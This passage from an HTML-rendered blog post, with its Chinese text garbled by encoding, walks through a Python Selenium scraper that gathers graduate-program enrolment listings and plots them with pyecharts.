<span class=\"comment\"># print(len(li))</span></span><br><span class=\"line\">    <span class=\"comment\"># ç¬¬ä¸€é¡µå³ä¸‹è§’çš„æ ‡ç­¾æ•°é‡æœ€å¤§ä¸º10ï¼Œå°äº10æ—¶æ²¡æœ‰ Go è¾“å…¥è·³è½¬æ¡†</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(len(li) &lt; <span class=\"number\">10</span>):</span><br><span class=\"line\">        pagenumber = int(li[<span class=\"number\">-2</span>].text)</span><br><span class=\"line\">    <span class=\"comment\"># print(pagenumber)</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        pagenumber = int(li[<span class=\"number\">-3</span>].text)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pagenumber</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>è·å–ç ”ç©¶æ–¹å‘ç­‰ä¿¡æ¯</p>\n<p>ä¸é™¢æ ¡åˆ—è¡¨é¡µé¢ä¸åŒï¼Œå„ä¸ªå­¦æ ¡å¯¹åº”çš„ç ”ç©¶æ–¹å‘çš„æ•°é‡ä¸åŒï¼Œå­˜åœ¨ç ”ç©¶æ–¹å‘é¡µé¢æ•°é‡ä¸åŒçš„æƒ…å†µï¼Œè¿™ä¹Ÿé€ æˆäº†æˆ‘ä»¬æ— æ³•é€šè¿‡ä¸€ç§å›ºå®šçš„æ–¹æ³•æ¥å¯¹æ‰€ç”¨çš„æƒ…å†µè¿›è¡Œå¤„ç†ï¼Œäºæ˜¯ï¼Œåœ¨è¿™æ®µä»£ç é‡Œå¢åŠ äº†æ•°é‡åˆ¤æ–­ã€‚</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_info</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># å½“å‰ Tab é‡Œæœ‰å¤šå°‘ä¸ªé¡µé¢</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        majors = <span class=\"number\">0</span></span><br><span class=\"line\">        all_number = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># å®šä½è·³è½¬</span></span><br><span class=\"line\">        css_selector_jumpto = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-row.clearfix \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-page-box ul.ch-page \"</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">            major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">            majors += len(major)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(<span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                    numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                    all_number += int(numbers)</span><br><span class=\"line\">                    print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(pagenumber &lt; <span class=\"number\">7</span> ):</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(</span><br><span class=\"line\">                                <span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                            numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                            print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\">                            all_number += int(numbers)</span><br><span class=\"line\">                        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                            print(e)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        print(e)</span><br><span class=\"line\">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ä¸‹ä¸€é¡µæŒ‰é’®ä½ç½®ä¸åŒ,ç”¨ Go</span></span><br><span class=\"line\">            flag = <span class=\"number\">2</span>  <span class=\"comment\"># ä¸‹ä¸€æ¬¡è¦Goçš„é¡µç </span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">                driver.find_element_by_css_selector(<span class=\"string\">\"#goPageNo\"</span>).send_keys(str(flag))  <span class=\"comment\"># è¾“å…¥é¡µç è·³è½¬</span></span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='page-btn']\"</span>).click()  <span class=\"comment\"># ç‚¹å‡» Goï¼Œä»ç„¶åŒæ˜¯ä¸€ä¸ª window_handle</span></span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">                flag +=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(len(major_list))</span></span><br><span class=\"line\">        print(<span class=\"string\">\"ä¸“ä¸šæ•°é‡ï¼š \"</span> + str(majors))</span><br><span class=\"line\">        print(<span class=\"string\">\"  å…±æ‹›ç”Ÿ: \"</span> + str(all_number))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> majors, all_number</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<ol start=\"6\">\n<li><p>ä¿å­˜æ•°æ®</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä¿å­˜æ•°æ®</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">save_data</span><span class=\"params\">(data_list)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"../major_info.txt\"</span>, <span class=\"string\">\"w\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> data_list:</span><br><span class=\"line\">            f.write(line + <span class=\"string\">\"\\r\"</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>å…³é—­æµè§ˆå™¨</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">driver.close()</span><br><span class=\"line\">driver.quit()</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h3 id=\"æ•°æ®å¯è§†åŒ–åˆ†æ\"><a href=\"#æ•°æ®å¯è§†åŒ–åˆ†æ\" class=\"headerlink\" title=\"æ•°æ®å¯è§†åŒ–åˆ†æ\"></a>æ•°æ®å¯è§†åŒ–åˆ†æ</h3><p>æ•°æ®å¯è§†åŒ–æˆ‘ä»¬é€‰æ‹© <a href=\"http://pyecharts.org/#/zh-cn/intro\" target=\"_blank\" rel=\"noopener\">pyecharts</a> ,åŸå› åœ¨äºå®ƒçš„é«˜åº¦æŠ½è±¡ï¼Œæå¤§çš„ç®€åŒ–äº†æˆ‘ä»¬å¯¹æ•°æ®è¿›è¡Œå¯è§†åŒ–çš„æ“ä½œéš¾åº¦ã€‚</p>\n<p>è¯¥é¡¹ç›®ä¸­æˆ‘ä»¬ä¸»è¦åœ¨ä¸‰å¤„ä½¿ç”¨äº†å¯è§†åŒ–ç›¸å…³æ“ä½œï¼Œåˆ†åˆ«æ˜¯ï¼š</p>\n<ol>\n<li>å¯¹ç›¸å…³é«˜æ ¡åœ¨å„çœåˆ†å¸ƒçš„å…¨å›½åœ°å›¾ç»˜åˆ¶</li>\n<li>å¯¹é€‰æ‹©åŸå¸‚å¼€è®¾ç›®æ ‡ä¸“ä¸šçš„é«˜æ ¡æ‹›ç”Ÿæƒ…å†µçš„æŠ˜çº¿å›¾ç»˜åˆ¶</li>\n<li>å¯¹ç›®æ ‡é«˜æ ¡å¼€è®¾ç›®æ ‡ä¸“ä¸šçš„æ‹›ç”Ÿæƒ…å†µæŸ±çŠ¶å›¾ç»˜åˆ¶</li>\n</ol>\n<p>æ•°æ®å¯è§†åŒ–çš„å…³é”®åœ¨äº <strong>æ•°æ®çš„æ ¼å¼åŒ–</strong> ï¼Œå‰”é™¤æ— å…³æ•°æ®ï¼Œä¿è¯å®Œæ•´çš„æ•°æ®å…³ç³»</p>\n<p>ä»¥ç»˜åˆ¶å…¨å›½åœ°å›¾ä¸ºä¾‹ï¼Œåœ¨å¾—åˆ°å„ä¸ªåŒ…å«å„ä¸ªçœå¸‚åç§°çš„åˆ—è¡¨ä¹‹åï¼Œéœ€è¦å¯¹è¿™äº›åç§°è¿›è¡Œæ ¼å¼åŒ–å¤„ç†ï¼Œåªä¿ç•™ä¸»è¦å…³é”®å­—ï¼šåŒ—äº¬å¸‚-&gt;åŒ—äº¬ã€æ–°ç–†ç»´å¾å°”æ—è‡ªæ²»åŒº -&gt; æ–°ç–†ã€é»‘é¾™æ±Ÿçœ -&gt; é»‘é¾™æ±Ÿ ç­‰</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">realcity = []</span><br><span class=\"line\">            <span class=\"comment\"># å¤„ç†åŸå¸‚åï¼Œåªä¿ç•™ä¸¤å­—æˆ–ä¸‰å­—åç§°</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> citys <span class=\"keyword\">in</span> city_name:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">\"é»‘é¾™æ±Ÿ\"</span> <span class=\"keyword\">in</span> citys:</span><br><span class=\"line\">                    a = <span class=\"string\">\"é»‘é¾™æ±Ÿ\"</span></span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"string\">\"å†…è’™å¤\"</span> <span class=\"keyword\">in</span> citys:</span><br><span class=\"line\">                    a = <span class=\"string\">\"å†…è’™å¤\"</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    a = citys[<span class=\"number\">4</span>:<span class=\"number\">6</span>]</span><br><span class=\"line\">                realcity.append(a)</span><br><span class=\"line\">            <span class=\"comment\"># print(realcity)</span></span><br><span class=\"line\">            <span class=\"comment\"># å°†æ•°æ®å¤„ç†æˆåˆ—è¡¨</span></span><br><span class=\"line\">            list1 = [[realcity[i], school_counts[i]] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(realcity))]</span><br></pre></td></tr></table></figure>\n\n<p>å†å°†åŸå¸‚åç§°åˆ—è¡¨ä¸æ•°é‡åˆ—è¡¨åˆå¹¶ä¹‹åï¼Œå³å¯ç»˜åˆ¶åœ°å›¾</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map_1 = Map()</span><br><span class=\"line\">            map_1.set_global_opts(</span><br><span class=\"line\">                title_opts=opts.TitleOpts(title=<span class=\"string\">\"2020é«˜æ ¡åˆ†å¸ƒ\"</span>),</span><br><span class=\"line\">                visualmap_opts=opts.VisualMapOpts(max_=<span class=\"number\">40</span>)  <span class=\"comment\"># æœ€å¤§æ•°æ®èŒƒå›´</span></span><br><span class=\"line\">            )</span><br><span class=\"line\">            map_1.add(<span class=\"string\">\"2020é«˜æ ¡åˆ†å¸ƒ\"</span>, list1, maptype=<span class=\"string\">\"china\"</span>)</span><br><span class=\"line\">            map_1.render(<span class=\"string\">'SchoolMap.html'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>å…¶ä»–ä¸¤ä¸ªä¾‹å­åŒç†</p>\n<h2 id=\"åŠŸèƒ½åˆ’åˆ†\"><a href=\"#åŠŸèƒ½åˆ’åˆ†\" class=\"headerlink\" title=\"åŠŸèƒ½åˆ’åˆ†\"></a>åŠŸèƒ½åˆ’åˆ†</h2><p>æœ‰äº†å¯è§†åŒ–ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•å°†ä»£ç åŠŸèƒ½åˆ’åˆ†çš„æ›´ç»†è‡´ã€‚ä¸»è¦å®ç°ä¸‰ä¸ªåŠŸèƒ½ï¼š</p>\n<ol>\n<li>æ ¹æ®è¾“å…¥çš„é—¨ç±»ç±»åˆ«ä»£ç ï¼Œå­¦ç§‘ç±»åˆ«ä»£ç æ¥ç»˜åˆ¶ç¬¦åˆæ¡ä»¶çš„é«˜æ ¡åœ¨å…¨å›½å„çœçš„åˆ†å¸ƒæƒ…å†µ</li>\n<li>æ ¹æ®è¾“å…¥çš„çœä»½ã€é—¨ç±»ç±»åˆ«ä»£ç ã€å­¦ç§‘ç±»åˆ«ä»£ç æ¥ç»˜åˆ¶ç¬¦åˆæ¡ä»¶çš„é«˜æ ¡å¯¹åº”ä¸“ä¸šçš„æ‹Ÿæ‹›ç”Ÿäººæ•°ç­‰ä¿¡æ¯</li>\n<li>æ ¹æ®è¾“å…¥çš„é«˜æ ¡åç§°ã€å­¦ç§‘ç±»åˆ«ä»£ç æ¥ç»˜åˆ¶è¯¥é«˜æ ¡å¼€è®¾çš„ä¸“ä¸šæ•°é‡å’Œå¯¹åº”çš„æ‹Ÿæ‹›ç”Ÿäººæ•°</li>\n</ol>\n<h3 id=\"é¢å‘å¯¹è±¡\"><a href=\"#é¢å‘å¯¹è±¡\" class=\"headerlink\" title=\"é¢å‘å¯¹è±¡\"></a>é¢å‘å¯¹è±¡</h3><p>å°†åŠŸèƒ½æŠ½è±¡ä¸ºä¸‰ä¸ªç±»ï¼Œåˆ†åˆ«ä¸ºï¼š<code>SchoolMap</code> ã€ <code>ReserachDirections</code> ã€ <code>RDsBySchoolName</code> </p>\n<p><code>SchoolMap</code> è´Ÿè´£å®ç°åŠŸèƒ½ä¸€ï¼Œä¸»è¦ä»£ç </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿”å›å½“å‰æ‰€é€‰æ‹©åŸå¸‚å¼€è®¾ç›®æ ‡ä¸“ä¸šçš„é«˜æ ¡æ•°é‡</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">count_city</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        counts = <span class=\"number\">0</span></span><br><span class=\"line\">        self.FlagOfProcess = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                counts = len(numbers)</span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                self.FlagOfProcess = <span class=\"literal\">False</span></span><br><span class=\"line\">                print(<span class=\"string\">\"æŸ¥æ‰¾å¤±è´¥ï¼Œè¯·æ£€æŸ¥å½“å‰é¡µé¢æ˜¯å¦ä¸ºç©ºï¼\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> (pagenumber &lt; <span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                counts += len(numbers)</span><br><span class=\"line\">                ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ä¸‹ä¸€é¡µæŒ‰é’®ä½ç½®ä¸åŒ,ç”¨ Go</span></span><br><span class=\"line\">            flag = <span class=\"number\">2</span>  <span class=\"comment\"># ä¸‹ä¸€æ¬¡è¦Goçš„é¡µç </span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                <span class=\"comment\"># å®šä½é¡µç </span></span><br><span class=\"line\">                counts += len(numbers)</span><br><span class=\"line\">                driver.find_element_by_css_selector(<span class=\"string\">\"#goPageNo\"</span>).send_keys(str(flag))  <span class=\"comment\"># è¾“å…¥é¡µç è·³è½¬</span></span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='page-btn']\"</span>).click()  <span class=\"comment\"># ç‚¹å‡» Goï¼Œä»ç„¶åŒæ˜¯ä¸€ä¸ª window_handle</span></span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\">                flag += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> counts</span><br></pre></td></tr></table></figure>\n\n<p><code>ReserachDirections</code> ä¸»è¦å®ç°åŠŸèƒ½äºŒï¼Œä¸»è¦ä»£ç ä¸ºï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è·å¾—æŸä¸ªé™¢æ ¡åœ¨ç›®æ ‡ä¸“ä¸šä¸‹çš„ç ”ç©¶æ–¹å‘çš„æ•°é‡ï¼Œè¿”å›æ•°é‡åˆ—è¡¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_info</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># å½“å‰ Tab é‡Œæœ‰å¤šå°‘ä¸ªé¡µé¢</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        majors = <span class=\"number\">0</span></span><br><span class=\"line\">        all_number = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># å®šä½è·³è½¬</span></span><br><span class=\"line\">        css_selector_jumpto = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-row.clearfix \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-page-box ul.ch-page \"</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">            major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">            majors += len(major)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(<span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                    numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                    all_number += int(numbers)</span><br><span class=\"line\">                    print(<span class=\"string\">\"  æ‹Ÿæ‹›ç”Ÿï¼š\"</span> + numbers)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(pagenumber &lt; <span class=\"number\">7</span> ):</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span>(pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    print(<span class=\"string\">\"è¿™ä¸€é¡µçš„ä¸“ä¸šæ•°é‡\"</span> + str(len(major)))</span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            number = driver.find_element_by_xpath(<span 